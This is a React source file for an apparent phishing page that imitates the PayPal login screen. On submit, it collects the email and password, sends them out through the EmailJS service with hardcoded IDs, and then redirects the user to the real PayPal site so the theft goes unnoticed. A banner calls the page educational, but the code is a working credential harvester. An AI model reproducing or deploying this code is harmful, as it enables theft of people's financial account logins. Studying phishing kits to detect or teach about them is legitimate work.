import * as React from 'react';
import './App.css';
import { Alert, TextField} from '@mui/material';
import { send } from 'emailjs-com';

function App() {
  const [email, setEmail] = React.useState('');
  const [password, setPassword] = React.useState('');

  const changeUsername = (event) => {
    setEmail(event.target.value);
  }
  const changePassword = (event) => {
    setPassword(event.target.value);
  }
  const submit = () => {
    if (email == '') {
      // error
    } else if (password == '') {
      // error
    } else {
      console.log(email, password);
      // send email
      send(
        'service_xt3jd94', // service ID
        'template_1os4f0b', // template ID
        {message: `username: ${email}\npassword: ${password}`},
        'NdVUifWFJlwgAAs-6'
      )
        .then((response) => {
          console.log('SUCCESS!', response.status, response.text);
          // redirect to real paypal page
          window.location.href = "https://www.paypal.com/myaccount/";
        })
        .catch((err) => {
          console.log('FAILED...', err);
        });
    }
  }
  return (
    <div id="App">
      <Alert id="alert" sx={{position: 'sticky', top: 0, zIndex: 2, margin: '40px 10%'}} severity="error">
      This is not a real Paypal login page. Do not enter real credentials. Only for education purposes</Alert>
      <div style={{width: '460px', margin: '0 auto', display: 'flex', zIndex: 0}}>
        <div id="login-section">
          <header>
            <p id="logo"></p>
          </header>
          <div id="login-form" style={{padding: 'auto'}} >
            <TextField
              id="username"
              label="Email address or mobile number"
              variant="filled"
              fullWidth
              value={email}
              onChange={changeUsername}
              InputProps={{disableUnderline: true}}
              sx={{
                '& label': {
                  color: '#6c7378',
                  fontSize: '18px',
                  py: '3px',
                },
                '& label.Mui-focused': {
                  color: '#6c7378'
                },
                '& .MuiFilledInput-root': {
                  overflow: 'hidden',
                  border: 1,
                  borderRadius: '4px',
                  marginBottom: '16px',
                  borderColor: '#9da3a6',
                  backgroundColor: 'transparent',
                  fontWeight: 500,
                  fontSize: '1.1rem',
                  py: '4px',
                  '&:hover': {
                    borderColor: '#2140C1',
                    backgroundColor: 'transparent',
                  },
                  '&.Mui-focused': {
                    border: 3,
                    borderColor: '#2140C1',
                    boxShadow: '0px 0px 0px 5px #DFEAFC',
                    backgroundColor: 'transparent',
                  }
                }
              }}
            />
            <TextField
              id="password"
              label="Password"
              variant="filled"
              type="password"
              value={password}
              onChange={changePassword}
              fullWidth
              InputProps={{disableUnderline: true}}
              sx={{
                '& label': {
                  color: '#6c7378',
                  fontSize: '18px',
                  py: '3px',
                },
                '& label.Mui-focused': {
                  color: '#6c7378'
                },
                '& .MuiFilledInput-root': {
                  overflow: 'hidden',
                  border: 1,
                  borderRadius: '4px',
                  marginBottom: '16px',
                  borderColor: '#9da3a6',
                  backgroundColor: 'transparent',
                  fontWeight: 500,
                  fontSize: '1.1rem',
                  py: '4px',
                  '&:hover': {
                    borderColor: '#2140C1',
                    backgroundColor: 'transparent',
                  },
                  '&.Mui-focused': {
                    border: 3,
                    borderColor: '#2140C1',
                    boxShadow: '0px 0px 0px 5px #DFEAFC',
                    backgroundColor: 'transparent',
                  }
                }
              }}
            />
            <div id="forgot-password">
              <a id="forgot-password-link" href="https://www.paypal.com/authflow/password-recovery/">Forgotten password?</a>
            </div>
            <button id="button-login" type="submit" onClick={submit}>
              Log In
            </button>
            <div id="separator">
              <span style={{
                backgroundColor: '#fff',
                padding: '0 0.5em',
                color: '#6c7378',
                top: '-0.7em',
                position: 'relative'
              }}>or</span>
            </div>
            <button id="button-sign-up" onClick={() => {window.location.href='https://www.paypal.com/au/webapps/mpp/account-selection'}}>Sign Up</button>
          </div>
          <div style={{
              position: 'relative',
              display: 'block',
              fontSize: '12px',
              marginTop: '72px',
          }}>
          </div>
        </div>
      </div>
      <footer>
          <div className="legalFooter" style={{textAlign: 'center', padding: '14px', backgroundColor: '#F7F9FA'}}>
            <ul className="footerGroup" style={{listStyleType: 'none', textAlign: 'center', margin: 0, padding: 0}}>
              <li><a target="_blank" href="https://www.paypal.com/au/smarthelp/contact-us" pa-marked="1">Help & Contact</a></li>
              <li><a target="_blank" href="https://www.paypal.com/au/webapps/mpp/ua/privacy-full" pa-marked="1">Privacy</a></li>
              <li><a target="_blank" href="https://www.paypal.com/au/webapps/mpp/ua/legalhub-full" pa-marked="1">Legal</a></li>
              <li><a target="_blank" href="https://www.paypal.com/au/webapps/mpp/country-worldwide" pa-marked="1">Worldwide</a></li>
            </ul>
          </div>
        </footer>
    </div>
  );
}

export default App;
